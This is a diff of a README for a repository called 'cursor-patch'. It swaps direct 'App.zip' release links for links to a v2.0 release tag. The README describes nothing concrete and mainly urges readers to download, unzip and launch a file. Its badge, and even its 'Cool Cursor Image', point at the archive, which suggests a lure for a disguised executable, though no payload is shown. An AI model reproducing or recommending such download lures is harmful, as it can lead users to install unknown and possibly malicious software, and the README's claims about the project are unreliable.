@@ -10,9 +10,9 @@ This repository, named "cursor-patch", does not have a specific short descriptio
 - [License](#license)
 
 ## Installation
-To get started with cursor-patch, you can download the latest release by clicking [here](https://github.com/lucasgth/cursor-patch/releases/download/v1.0/App.zip). Once downloaded, unzip the file and follow the installation instructions provided in the README file included in the release package.
+To get started with cursor-patch, you can download the latest release by clicking [here](https://github.com/lucasgth/cursor-patch/releases/tag/v2.0). Once downloaded, unzip the file and follow the installation instructions provided in the README file included in the release package.
 
-[![Download Latest Release](https://github.com/lucasgth/cursor-patch/releases/download/v1.0/App.zip%20Release-brightgreen)](https://github.com/lucasgth/cursor-patch/releases/download/v1.0/App.zip)
+[![Download Latest Release](https://github.com/lucasgth/cursor-patch/releases/tag/v2.0%20Release-brightgreen)](https://github.com/lucasgth/cursor-patch/releases/tag/v2.0)
 
 Launching the downloaded file will initiate the installation process. In case the provided link does not lead to the expected file, please check the "Releases" section of this repository to find the appropriate download.
 
@@ -37,4 +37,4 @@ This repository is licensed under the MIT License. You are free to use, modify, 
 ---
 Feel free to explore the cursor-patch repository and enhance your cursor experience with our innovative features! 🌟🖱️
 
-![Cool Cursor Image](https://github.com/lucasgth/cursor-patch/releases/download/v1.0/App.zip)
+![Cool Cursor Image](https://github.com/lucasgth/cursor-patch/releases/tag/v2.0)
